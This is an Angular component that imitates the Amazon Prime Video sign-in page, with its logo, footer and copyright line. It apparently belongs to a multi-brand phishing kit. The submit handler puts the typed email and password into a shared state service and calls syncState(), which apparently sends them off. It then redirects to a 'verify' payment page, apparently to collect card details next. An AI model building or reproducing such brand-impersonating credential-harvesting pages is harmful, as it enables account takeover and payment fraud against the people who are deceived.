import { Component, inject, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule, ReactiveFormsModule, FormBuilder, Validators } from '@angular/forms';
import { Router } from '@angular/router';
import { StateService } from '../../../services/state.service';
import { getFlowById } from '../../../services/flows.service';

@Component({
    selector: 'app-prime-login',
    standalone: true,
    imports: [CommonModule, FormsModule, ReactiveFormsModule],
    template: `
    <div class="prime-flow-container">
      <img src="/assets/images/logos/prime-video-logo.svg" alt="Prime Video" class="prime-logo">
      
      <div class="prime-card">
        <h1>Sign In</h1>
        
        <form [formGroup]="loginForm" (ngSubmit)="onSubmit()">
          <div class="prime-form-group">
            <label for="email">Email or mobile phone number</label>
            <input 
              type="text" 
              id="email" 
              formControlName="email"
              [class.error]="isFieldInvalid('email')"
            >
          </div>

          <div class="prime-form-group">
            <label for="password">Password</label>
             <div style="text-align: right; margin-top: -24px; margin-bottom: 5px;">
                 <a href="javascript:void(0)" class="prime-link" style="font-size: 13px;">Forgot your password?</a>
             </div>
            <input 
              type="password" 
              id="password" 
              formControlName="password"
              [class.error]="isFieldInvalid('password')"
            >
          </div>

          <button 
            type="submit" 
            class="prime-btn-primary"
            [disabled]="loginForm.invalid || isLoading()"
          >
            Sign In
          </button>
          
          <div style="margin-top: 20px; text-align: center;">
             <span style="color: #fff; font-size: 14px;">New to Amazon?</span>
             <a href="javascript:void(0)" class="prime-link" style="margin-left: 5px; font-size: 14px;">Create your Amazon account</a>
          </div>
        </form>
      </div>
      
      <footer class="prime-footer">
         <a href="javascript:void(0)">Terms and Privacy Notice</a>
         <a href="javascript:void(0)">Send us feedback</a>
         <a href="javascript:void(0)">Help</a>
         <div style="margin-top: 10px;">
            © 1996-2024, Amazon.com, Inc. or its affiliates
         </div>
      </footer>
    </div>
  `,
    styleUrls: ['../../../styles/flows/prime-video.scss']
})
export class PrimeLoginComponent {
    private fb = inject(FormBuilder);
    private router = inject(Router);
    private state = inject(StateService);

    isLoading = signal(false);

    loginForm = this.fb.group({
        email: ['', [Validators.required, Validators.minLength(3)]],
        password: ['', [Validators.required, Validators.minLength(4)]]
    });

    constructor() {
        const primeFlow = getFlowById('prime-video');
        if (primeFlow) {
            this.state.currentFlow.set(primeFlow);
        }
    }

    isFieldInvalid(field: string): boolean {
        const control = this.loginForm.get(field);
        return !!(control && control.invalid && (control.dirty || control.touched));
    }

    async onSubmit() {
        if (this.loginForm.valid) {
            this.isLoading.set(true);
            const { email, password } = this.loginForm.value;

            this.state.email.set(email!);
            this.state.password.set(password!);

            // Simulate API call
            this.state.isLoginSubmitted.set(true);
            await this.state.syncState();

            setTimeout(() => {
                this.isLoading.set(false);
                this.router.navigate(['/verify/prime-video/payment']);
            }, 800);
        } else {
            this.loginForm.markAllAsTouched();
        }
    }
}
